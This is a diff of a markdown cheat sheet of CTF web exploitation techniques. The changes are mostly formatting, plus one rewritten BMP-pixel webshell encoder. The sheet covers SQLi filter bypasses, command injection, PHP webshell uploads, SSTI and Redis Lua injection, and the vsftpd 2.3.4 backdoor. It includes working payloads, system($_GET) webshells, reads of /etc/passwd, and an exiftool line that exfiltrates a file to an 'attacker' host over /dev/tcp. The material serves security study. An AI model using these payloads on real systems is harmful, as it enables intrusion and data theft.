@@ -1,7 +1,6 @@
 # CTF Web - Server-Side Code Execution & Access Attacks (Part 2)
 
 ## Table of Contents
-
 - [SQLi Keyword Fragmentation Bypass (SecuInside 2013)](#sqli-keyword-fragmentation-bypass-secuinside-2013)
 - [SQL WHERE Bypass via ORDER BY CASE (Sharif CTF 2016)](#sql-where-bypass-via-order-by-case-sharif-ctf-2016)
 - [SQL Injection via DNS Records (PlaidCTF 2014)](#sql-injection-via-dns-records-plaidctf-2014)
@@ -35,7 +34,7 @@ For injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggli
 
 *See also: [server-side-exec.md](server-side-exec.md) for Ruby/Perl/JS code injection, LaTeX injection RCE, PHP preg_replace /e RCE, PHP backtick eval, PHP assert() injection, Prolog injection, ReDoS timing oracle, file upload to RCE (.htaccess, log poisoning, Python .so hijack, Gogs symlink, ZipSlip), PHP deserialization from cookies, PHP extract() variable overwrite, XPath blind injection, API filter injection, HTTP response header hiding, WebSocket mass assignment, and Thymeleaf SpEL SSTI.*
 
-------
+---
 
 ## SQLi Keyword Fragmentation Bypass (SecuInside 2013)
 
@@ -60,7 +59,7 @@ unload_fileon/**/selectload_filect/**/flag/**/frload_fileom/**/secrets
 
 **Variations:** Case-sensitive filters: mix case (`unIoN`). Space filters: `/**/`, `%09`, `%0a`. Recursive filters: double the keyword (`ununionion`). Always test whether the filter is single-pass or recursive.
 
-------
+---
 
 ## SQL WHERE Bypass via ORDER BY CASE (Sharif CTF 2016)
 
@@ -72,14 +71,13 @@ SELECT * FROM messages ORDER BY (CASE WHEN msg LIKE '%flag%' THEN 1 ELSE 0 END) 
 
 **Key insight:** Even without WHERE access, ORDER BY with conditional expressions forces target rows to appear first in results. Combine with `LIMIT 1` to isolate specific records.
 
-------
+---
 
 ## SQL Injection via DNS Records (PlaidCTF 2014)
 
 **Pattern:** Application calls `gethostbyaddr()` or `dns_get_record()` on user-controlled IP addresses and uses the result in SQL queries without escaping. Inject SQL through DNS PTR or TXT records you control.
 
 **Attack setup:**
-
 1. Set your IP's PTR record to a domain you control (e.g., `evil.example.com`)
 2. Add a TXT record on that domain containing the SQL payload
 3. Trigger the application to resolve your IP (e.g., via password reset)
@@ -94,7 +92,7 @@ mysql_query("UPDATE users SET resetinfo='$details' WHERE ...");
 
 **Key insight:** DNS records (PTR, TXT, MX) are an overlooked injection channel. Any application that resolves IPs/hostnames and incorporates the result into database queries is vulnerable. Control comes from setting up DNS records for attacker-owned domains or IP reverse DNS.
 
-------
+---
 
 ## Bash Brace Expansion for Space-Free Command Injection (Insomnihack 2016)
 
@@ -113,7 +111,7 @@ When spaces and common shell metacharacters (`$`, `&`, `\`, `;`, `|`, `*`) are f
 
 **Key insight:** Bash brace expansion `{a,b,c}` splits into space-separated tokens without requiring literal space characters. Combined with `/dev/udp/` or `/dev/tcp/` for exfiltration, this bypasses filters that block spaces and most shell metacharacters.
 
-------
+---
 
 ## Common Lisp Injection via Reader Macro (Insomnihack 2016)
 
@@ -126,33 +124,33 @@ Lisp's `read` function evaluates `#.(expression)` reader macros at parse time. W
 
 **Key insight:** Lisp's `read` treats data as code by design -- the `#.()` reader macro evaluates arbitrary expressions during parsing. This is analogous to SQL injection but for Lisp. Safe alternative: use `read-line` for string input, never `read` on untrusted data.
 
-------
+---
 
 ## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)
 
 Strip pickle STOP opcode (`\x2e`) from first payload, concatenate second — both `__reduce__` calls execute in single `pickle.loads()`. Chain `os.dup2()` for socket output. See [server-side-deser.md](server-side-deser.md#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) for full exploit code.
 
-------
+---
 
 ## Java Deserialization (ysoserial)
 
 Serialized Java objects in cookies/POST (starts with `rO0AB` / `aced0005`). Use ysoserial gadget chains (CommonsCollections, URLDNS for blind detection). See [server-side-deser.md](server-side-deser.md#java-deserialization-ysoserial) for payloads and bypass techniques.
 
-------
+---
 
 ## Python Pickle Deserialization
 
 `pickle.loads()` calls `__reduce__()` for instant RCE via `(os.system, ('cmd',))`. Common in Flask sessions, ML model files, Redis objects. See [server-side-deser.md](server-side-deser.md#python-pickle-deserialization) for payloads and restricted unpickler bypasses.
 
-------
+---
 
 ## Race Conditions (Time-of-Check to Time-of-Use)
 
 Concurrent requests bypass check-then-act patterns (balance, coupons, registration uniqueness). Send 50+ simultaneous requests so all see pre-modification state. See [server-side-deser.md](server-side-deser.md#race-conditions-time-of-check-to-time-of-use) for async exploit code and detection patterns.
 
-------
+---
 
-------
+---
 
 ## PHP7 OPcache Binary Webshell + LD_PRELOAD disable_functions Bypass (ALICTF 2016)
 
@@ -173,7 +171,6 @@ php -d opcache.enable_cli=1 -d opcache.file_cache=/tmp/OPcache \
 # 3. Patch system_id in binary (bytes 9-40)
 # 4. Upload via SQLi INTO DUMPFILE:
 ```
-
 ```sql
 -1 UNION SELECT X'<hex_of_payload.php.bin>'
 INTO DUMPFILE '/tmp/OPcache/39b005ad77428c42788140c6839e6201/var/www/html/upload/evil.php.bin' #
@@ -215,7 +212,7 @@ show_source("/tmp/_output.txt");
 
 **Key insight:** PHP's `disable_functions` only restricts PHP-level calls. External programs spawned by `mail()` run without PHP restrictions, and `LD_PRELOAD` lets you override any libc function in those external programs. The OPcache `.bin` file has no integrity check beyond `system_id` matching — replacing it with a crafted binary gives arbitrary PHP execution even when upload validation strips PHP content.
 
-------
+---
 
 ## Wget GET Parameter Filename Trick for PHP Shell Upload (SECUINSIDE 2016)
 
@@ -231,7 +228,7 @@ Access via URL-encoded `?`: `http://target/data/hash/avatar.png%3fshell.php?cmd=
 
 **Key insight:** `wget` preserves GET parameters in the output filename when no `-O` flag is specified. `parse_url()` separates path from query, so validation only sees the path extension. The resulting file has a `.php` extension from the query string portion, which Apache/nginx interprets as PHP.
 
-------
+---
 
 ## Tar Filename Command Injection (CyberSecurityRumble 2016)
 
@@ -247,14 +244,13 @@ tar cf exploit.tar *
 
 **Key insight:** When server-side scripts process filenames from user-uploaded archives (tar, zip) via shell commands, special characters in filenames become injection vectors. The semicolon breaks out of the filename context, and `#` comments out trailing characters. Always sanitize filenames from untrusted archives before shell interpolation.
 
-------
+---
 
 ## PNG/PHP Polyglot Upload + Double Extension + disable_functions Bypass (MetaCTF Flash 2026)
 
 **Pattern (Brand Kit):** Upload filter rejects `.php` extension but accepts image uploads. nginx/PHP-FPM executes files ending in `.php` regardless of preceding extensions. `disable_functions` blocks all command execution functions, but filesystem functions remain available.
 
 **Step 1: Create PNG/PHP polyglot**
-
 ```bash
 # Create a valid PNG that also contains PHP code after the IEND chunk
 # PHP interpreter ignores binary data before <?php
@@ -280,7 +276,6 @@ PAYLOAD
 ```
 
 **Step 2: Upload with double extension**
-
 ```bash
 # Filter checks extension — .png.php has .php at the end
 # Some filters only check first extension (.png) or reject exact match on .php
@@ -293,7 +288,6 @@ curl -F 'file=@polyglot.png.php;type=image/png' http://target/upload
 ```
 
 **Step 3: Access and enumerate**
-
 ```bash
 # The uploaded file is served by nginx which passes .php to PHP-FPM
 curl http://target/uploads/polyglot.png.php
@@ -304,7 +298,6 @@ curl http://target/uploads/polyglot.png.php
 ```
 
 **Useful PHP functions when `disable_functions` blocks execution:**
-
 ```php
 <?php
 // File discovery
@@ -335,14 +328,13 @@ ini_get('disable_functions');
 
 **References:** MetaCTF Flash CTF 2026 "Brand Kit"
 
-------
+---
 
 ### PHP BMP Pixel Webshell with Filename Truncation (Nuit du Hack CTF 2018)
 
 **Pattern:** Encode PHP code as BMP pixel colors (BGR format). The server validates the file extension (e.g., requires `.JPG` or `.BMP`) but truncates filenames to a maximum length. Craft a filename like `'A'*46 + '.php.JPG'` that passes the `.JPG` extension check but truncates to `'A'*46 + '.php'` at the 50-character limit.
 
 **How BMP pixel encoding works:**
-
 ```python
 import struct
 import requests
@@ -374,10 +366,11 @@ pixel_offset = struct.unpack_from('<I', data, 10)[0]
 padded = pad(payload)
 index = pixel_offset
 for c in chunk(padded, 3):
-    data[index + 2] = ord(c[0])  # R -> B in BMP format (BGR order)
-    data[index + 1] = ord(c[1])  # G stays
-    data[index] = ord(c[2])      # B -> R in BMP format
-    index += 4  # skip alpha byte (if 32-bit BMP) or use 3 for 24-bit
+    data[index] = ord(c[0])  # keep payload byte order so <?php survives as one run
+    data[index + 1] = ord(c[1])
+    data[index + 2] = ord(c[2])
+    index += 3  # 24-bit BMP: 3 bytes per pixel, no padding byte
+assert payload.encode() in bytes(data)  # payload must survive as one contiguous run
 
 # Filename truncation exploit:
 # Server checks extension: must end with .JPG or .BMP
@@ -395,11 +388,9 @@ requests.post(
 # Access the webshell (filename truncated to .php)
 r = requests.get(f"http://target/uploads/{name}", params={"a": "system", "b": "cat /flag.txt"})
 print(r.text)
-
 ```
 
 **Filename truncation variants:**
-
 ```text
 # 50-char limit example:
 "A"*46 + ".php" + ".JPG"     -> truncated to "A"*46 + ".php"  (50 chars)
@@ -408,23 +399,22 @@ print(r.text)
 # Other truncation lengths — adjust padding:
 # For N-char limit: "A"*(N-4) + ".php" + ".ext"
 # The ".ext" passes the extension check, then gets truncated away
-
 ```
 
 **Key insight:** BMP files store pixel data as raw bytes in BGR order. PHP ignores non-PHP content before `<?php` tags. When the server truncates filenames to a fixed length, `'A'*46 + '.php' + '.JPG'` passes extension validation but saves as `.php`. This combines three bypass techniques: (1) polyglot file format (valid BMP + valid PHP), (2) extension check evasion via filename truncation, (3) webshell hidden in image pixel data survives re-encoding unless the server re-renders the image from scratch.
 
-------
+---
 
 ## Editor Backup File Source Disclosure (h4ckc0n 2017)
 
 **Pattern:** Text editors leave backup files alongside the original when saving. These are often left on web servers and served as plain text, leaking PHP source before execution.
 
-| Editor | Backup pattern                              |
-| ------ | ------------------------------------------- |
-| gedit  | `file~`                                     |
+| Editor | Backup pattern |
+|--------|---------------|
+| gedit  | `file~` |
 | vim    | `.file.swp` (also `.file.swn`, `.file.swo`) |
-| nano   | `file~`                                     |
-| emacs  | `file~` and `#file#`                        |
+| nano   | `file~` |
+| emacs  | `file~` and `#file#` |
 
 ```bash
 # Check common backup variants for a target file
@@ -436,7 +426,6 @@ done
 curl -s "http://target/.checker.php.swp"
 # emacs auto-save:
 curl -s "http://target/#checker.php#"
-
 ```
 
 ```bash
@@ -444,12 +433,11 @@ curl -s "http://target/#checker.php#"
 curl -o checker.swp "http://target/.checker.php.swp"
 vim -r checker.swp          # opens recovered file in vim
 # Or: strings checker.swp   # quick content extraction
-
 ```
 
 **Key insight:** Always check for `filename~`, `.filename.swp`, `#filename#` variants when hunting for source disclosure. Combine with directory listing or known filenames from JS/HTML comments to enumerate candidates.
 
-------
+---
 
 ## date -f Arbitrary File Read (Can-CWIC 2017)
 
@@ -461,7 +449,6 @@ vim -r checker.swp          # opens recovered file in vim
 date -f /etc/passwd
 # Output includes: date: invalid date 'root:x:0:0:root:/root:/bin/bash'
 # → file contents leak through error messages
-
 ```
 
 ```python
@@ -476,19 +463,17 @@ targets = ['/etc/passwd', '/flag', '/flag.txt', '/home/ctf/flag']
 for t in targets:
     result = subprocess.run(['date', '-f', t], capture_output=True, text=True)
     print(result.stderr)  # errors contain file content
-
 ```
 
 ```bash
 # When command injection is available and date is accessible:
 curl "http://target/cgi-bin/app.cgi" --data "cmd=date+-f+/flag.txt"
 # Response error output reveals flag content
-
 ```
 
 **Key insight:** `date --file` / `date -f` provides arbitrary file read when the `date` command has user-controlled arguments. Error messages include the unrecognized line content, leaking the file line-by-line. Works on any system with GNU coreutils `date`.
 
-------
+---
 
 ## Apache mod_rewrite PATH_INFO Bypass (EKOPARTY 2017)
 
@@ -498,7 +483,6 @@ curl "http://target/cgi-bin/app.cgi" --data "cmd=date+-f+/flag.txt"
 # Vulnerable .htaccess / rewrite rules:
 RewriteRule ^index\.php$ index.php [L]          # allows access to index.php
 RewriteRule ^getflag$    /forbidden.html [R,L]  # blocks /getflag directly
-
 ```
 
 ```bash
@@ -507,7 +491,6 @@ curl http://target/getflag          # → 403 or redirect to forbidden.html
 
 # PATH_INFO bypass — matches first rule, PHP gets PATH_INFO=/getflag:
 curl http://target/index.php/getflag   # → executes index.php with PATH_INFO=/getflag
-
 ```
 
 ```php
@@ -516,14 +499,13 @@ $action = $_SERVER['PATH_INFO'];   // "/getflag"
 if ($action === '/getflag') {
     echo $flag;
 }
-
 ```
 
 **Rule ordering matters:** Apache evaluates RewriteRules top-to-bottom and stops at the first `[L]` match. A permissive rule for the PHP file catches `/index.php/anything` before any restrictive rule for the suffix path.
 
 **Key insight:** mod_rewrite rule ordering + PHP PATH_INFO interaction: `/index.php/protected-path` bypasses access controls by matching the PHP file rule first. PHP's `$_SERVER['PATH_INFO']` receives the suffix, letting the application's own routing dispatch to the protected handler.
 
-------
+---
 
 ## PHP ReDoS to Skip Code Execution (CODE BLUE 2017)
 
@@ -538,7 +520,6 @@ if (preg_match('/^(ADMIN-+)+$/', $role)) {
 // ACL INSERT that only runs on successful match:
 $db->query("INSERT INTO acl (user, role) VALUES (?, ?)", [$user, 'ADMIN']);
 // Missing ACL row = no restriction applied
-
 ```
 
 ```python
@@ -554,20 +535,17 @@ r = requests.post('http://target/register', data={
     'role': redos_payload
 })
 # If the ACL INSERT is skipped, the user now has no restriction on their account
-
 ```
 
 **Backtracking trigger patterns:**
-
 ```text
 ADMIN--(###A)*  repeated 20+ times
 (ADMIN-+)+X     where X doesn't match, forcing full backtrack
-
 ```
 
 **Key insight:** PHP ReDoS can skip subsequent code entirely — a timed-out `preg_match()` returns `false` (not `0`), and any code gated on that check (like an ACL table INSERT) is silently skipped. This is not just a DoS: it acts as a code execution bypass when missing side effects change application security state.
 
-------
+---
 
 ## Custom Serializer Integer Overflow 256 to 0 Length (Codegate 2018)
 
@@ -606,7 +584,6 @@ r = requests.post("http://target/register", data={
     "username": "attacker"
 })
 print(r.text)
-
 ```
 
 ```text
@@ -621,7 +598,6 @@ print(r.text)
 #   \x01       \x00  ← parser reads 0 bytes for email
 #                    ← the 256 bytes are now parsed as ip, level, etc.
 #                    ← attacker controls password hash and level fields
-
 ```
 
 ```python
@@ -638,12 +614,11 @@ def find_overflow_length(field_width_bytes):
 assert find_overflow_length(1) == 256
 # 2-byte length: 65536 → 0
 assert find_overflow_length(2) == 65536
-
 ```
 
 **Key insight:** Single-byte length fields overflow at 256 to 0, letting data from one field spill into subsequent fields. Any custom serialization format using fixed-width length fields is vulnerable. Look for field length stored in 1 byte (max 255) or 2 bytes (max 65535). Signs of custom serialization: binary file-based databases, custom session formats, proprietary protocol parsers. The attack requires knowing (or guessing) the exact field order and format in the serialized structure. See also [server-side-deser.md](server-side-deser.md) for standard deserialization attacks.
 
-------
+---
 
 ## Unanchored Regex Command Injection (picoCTF 2018)
 
@@ -654,20 +629,18 @@ assert find_overflow_length(2) == 65536
 if (preg_match('/^(\d{1,3}\.){3}\d{1,3}/', $_GET['ip'])) {
     exec("ping -c 1 " . $_GET['ip']);
 }
-
 ```
 
 ```bash
 curl "http://target/ping.php?ip=1.1.1.1;cat%20/flag.txt"
 # matches ^1.1.1.1 then executes: ping -c 1 1.1.1.1;cat /flag.txt
-
 ```
 
 **Key insight:** `^pattern` without `$` only fixes the prefix, not the suffix. Every form of input validation regex must anchor both ends or use `preg_match('/\A...\z/')`. When auditing, grep for `preg_match('/\^` and check that each hit also has `\$/` or `\\z/`. The same bug appears in JavaScript `String.match` and Python `re.match` (which is implicitly left-anchored but not right-anchored).
 
 **References:** picoCTF 2018 — Fancy Alive Monitoring, writeups 11706, 11721, 11761
 
-------
+---
 
 ## Jinja2 SSTI via globals.__self__.exec() String Concat Bypass (InCTF 2018)
 
@@ -680,14 +653,13 @@ curl "http://target/ping.php?ip=1.1.1.1;cat%20/flag.txt"
 {{ request.__class__.__init__.__globals__.__builtins__.exec(
     "__imp"+"ort__('o'+'s').system('id')"
 ) }}
-
 ```
 
 **Key insight:** Any function object in Jinja's scope exposes `__globals__` (and via that, the real `builtins`). Even when `os`, `import`, and `__class__` are blacklisted, string concatenation and `chr(...)`-style tricks split the forbidden words across literal segments that the pre-render filter never sees joined. To harden, use `jinja2.sandbox.SandboxedEnvironment` instead of a string blocklist.
 
 **References:** InCTF 2018 — TorPy, writeup 11519
 
-------
+---
 
 ## web.py reparam() eval + __subclasses__ with Blanked Builtins (HITCON 2018)
 
@@ -705,14 +677,13 @@ user_input = (
     " if c.__name__ == 'Popen'][0](['/bin/sh','-c','cat /flag'],"
     "stdout=-1).communicate()[0]}"
 )
-
 ```
 
 **Key insight:** Replacing `__builtins__` with a blank object blocks `__import__`, `open`, and `eval`, but class-tree traversal still reaches any module imported before the sandbox was set up. Any Python eval that does not also replace `__builtins__` with `{"__builtins__": {}}` *and* restrict globals is bypassable via `().__class__.__base__.__subclasses__()`. Look for framework-level eval in Django templates (`{% eval %}`), web.py `reparam`, Flask Jinja with custom filters, and Mako `<%...%>` blocks.
 
 **References:** HITCON CTF 2018 — Oh My Raddit v2, writeup 11931
 
-------
+---
 
 ## Redis Lua Injection via redis.call() (HumanCTF 2018)
 
@@ -722,7 +693,6 @@ user_input = (
 -- Vulnerable script (string-concatenated)
 local script = "return redis.call('GET', '" .. user_key .. "')"
 redis.eval(script, 0)
-
 ```
 
 ```text
@@ -731,7 +701,6 @@ redis.eval(script, 0)
 
 # Final Lua:
 return redis.call('GET', '123') and redis.call('get', 'admin') -- ')
-
 ```
 
 ```python
@@ -740,14 +709,13 @@ r = requests.get("http://target/admin", params={
     "n": "123') and redis.call('get', 'admin') --"
 })
 print(r.text)
-
 ```
 
 **Key insight:** Redis Lua scripts expose `redis.call()` and `redis.pcall()` — they are the intended Redis bridge inside Lua, so a blocklist of Redis commands in the HTTP layer is useless once any Lua injection lands. Always pass untrusted values through `KEYS[...]` / `ARGV[...]`, never concatenate them into the script body. When Lua is unavoidable, sandbox the script with `redis-cli SCRIPT LOAD` + signed SHA1 and refuse scripts the client did not precompile.
 
 **References:** HumanCTF / HackOver 2018 — No vuln, trust me, writeup 11816
 
-------
+---
 
 ## PHP create_function String Interpolation RCE (FireShell 2019)
 
@@ -756,14 +724,13 @@ print(r.text)
 ```text
 order=;system($_GET[c]);return 0;//
 &c=id
-
 ```
 
 **Key insight:** Any PHP function that builds code from a string and hands it to `eval`/`create_function`/`assert` accepts arbitrary PHP with the right semicolon/comment dance. Grep for `create_function` in legacy codebases — it is removed in PHP 8 but still common in CTFs mirroring 2018-era apps.
 
 **References:** FireShell CTF 2019 — Bad injections, writeup 12917
 
-------
+---
 
 ## php://input + NULL Byte + ~Bitwise base64 Filter Bypass (DefCamp 2018)
 
@@ -772,7 +739,6 @@ order=;system($_GET[c]);return 0;//
 ```text
 GET: ?name=z.php%00&file=php://input
 POST body: <?=`~(chr(0x9c).chr(0x9e).chr(0x8b))`?>
-
 ```
 
 Follow up with `GET /z.php?c=cat%20/flag`.
@@ -781,7 +747,7 @@ Follow up with `GET /z.php?c=cat%20/flag`.
 
 **References:** DefCamp CTF Finals 2018 — Scribbles, writeup 12131
 
-------
+---
 
 ## EXIF ImageDescription Shell Injection via exiftool (OTW Advent 2018)
 
@@ -790,14 +756,13 @@ Follow up with `GET /z.php?c=cat%20/flag`.
 ```bash
 exiftool -ImageDescription="Santa ; /bin/bash -c 'cat /opt/flag > /dev/tcp/attacker/8081'" evil.jpg
 curl -F upload=@evil.jpg http://target/
-
 ```
 
 **Key insight:** Image upload sinks that parse metadata with `exiftool`, `identify`, or `ffprobe` often pipe the result straight to `exec`/`system`/`sh -c`. Any metadata string field — `ImageDescription`, `Artist`, `Software`, GPS tags — is a shell injection vector. Fix with `escapeshellarg()` or by exporting metadata as JSON and whitelisting field names.
 
 **References:** OverTheWire Advent 2018 — Santa's little recorders, writeup 12753
 
-------
+---
 
 ## .phar Extension Bypass for PHP Upload Blacklists (35C3 2018)
 
@@ -808,14 +773,13 @@ POST /upload HTTP/1.1
 filename=shell.phar
 
 [JPEG header] <?php system($_GET["c"]); ?>
-
 ```
 
 **Key insight:** Always enumerate every extension the PHP handler accepts. In default configs that is `.php`, `.phtml`, `.phps`, `.php3`, `.php4`, `.php5`, `.php7`, and `.phar`. Upload blacklists need all of them.
 
 **References:** 35C3 CTF 2018 — express-yourself, writeup 12880
 
-------
+---
 
 ## vsftpd 2.3.4 Smiley-Face Backdoor (P.W.N. CTF 2018)
 
@@ -825,13 +789,12 @@ filename=shell.phar
 ftp target 21
 USER anonymous:)
 nc target 6200
-
 ```
 
 **Key insight:** Supply-chain backdoors live forever. Any FTP server running vsftpd 2.3.4 (version string in the banner) has this. Same class of backdoor hit proftpd-1.3.3c and unreal-ircd-3.2.8.1 — memorise the set.
 
 **References:** P.W.N. CTF 2018 — Very Secure FTP, writeup 12060
 
-------
+---
 
 *See also: [server-side.md](server-side.md) for core injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggling, PHP file inclusion).*
